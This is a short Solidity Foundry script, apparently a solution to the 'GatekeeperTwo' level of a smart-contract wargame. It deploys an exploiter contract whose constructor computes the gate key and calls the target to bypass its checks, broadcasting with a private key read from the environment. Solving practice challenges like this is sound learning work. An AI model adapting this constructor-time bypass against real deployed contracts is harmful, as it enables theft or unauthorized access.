pragma solidity ^0.8.0;
import "../instances/Ilevel14.sol";
import "forge-std/Test.sol";

contract Level14 is Test {
    GatekeeperTwo level14 =
        GatekeeperTwo(0xA13D19183d2F7463B1d3D58881F6bfB296a74F6E);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        new GateKeeperTwoExploiter(address(level14));
        require(level14.entrant() == attacker);
        vm.stopBroadcast();
    }
}

contract GateKeeperTwoExploiter {
    constructor(address _target) public {
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        (bool success, ) = address(_target).call(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
        require(success);
    }
}
